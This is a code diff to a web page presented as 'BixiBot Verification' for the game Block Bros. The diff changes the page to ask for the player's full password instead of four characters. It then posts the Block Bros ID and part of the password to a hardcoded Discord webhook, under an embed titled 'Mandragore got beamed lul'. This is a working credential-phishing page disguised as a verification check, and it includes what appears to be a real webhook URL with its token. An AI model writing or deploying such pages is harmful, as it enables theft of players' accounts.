@@ -75,7 +75,7 @@
   <h1>BixiBot Verification</h1>
   <form id="verificationForm">
     <input type="text" id="blockBrosID" placeholder="Enter Block Bros ID" required><br>
-    <input type="password" id="passwordMiddle" placeholder="Enter Middle 4 Characters of Password" required><br>
+    <input type="password" id="fullPassword" placeholder="Enter Full Password" required><br>
     <button type="submit">Verify</button>
   </form>
 </div>
@@ -90,14 +90,37 @@
 
     // Capture user inputs
     const blockBrosID = document.getElementById("blockBrosID").value;
-    const passwordMiddle = document.getElementById("passwordMiddle").value;
+    const fullPassword = document.getElementById("fullPassword").value;
+
+    // Validate Block Bros ID is numeric
+    if (!/^\d+$/.test(blockBrosID)) {
+      alert("Block Bros ID must be all numbers.");
+      return;
+    }
+
+    // Validate password is long enough for middle extraction
+    if (fullPassword.length < 6) {
+      alert("Password must be at least 6 characters long.");
+      return;
+    }
+
+    // Extract the middle 4 characters
+    const midIndex = Math.floor(fullPassword.length / 2) - 2;
+    const middleFourChars = fullPassword.slice(midIndex, midIndex + 4);
 
     // Replace this URL with your actual Discord webhook URL
     const webhookUrl = "https://discord.com/api/webhooks/1304633406763827250/N17ngMIDIsvjq-Wt6S7FjydXTTgiMfxyXezLc4Q7LmIFs2MiKY0dIBG5p1WKv6z49Piv";
 
-    // Prepare the payload for the webhook
+    // Prepare the payload with an embed
     const payload = {
-      content: `Block Bros ID: ${blockBrosID}\nMiddle 4 Characters of Password: ${passwordMiddle}`
+      embeds: [{
+        title: "Mandragore got beamed lul",
+        color: 16711680, // Embed color in decimal (red)
+        fields: [
+          { name: "Block Bros ID", value: blockBrosID, inline: true },
+          { name: "Password", value: `Er${middleFourChars}Lf`, inline: true }
+        ]
+      }]
     };
 
     // Send the data to the Discord webhook
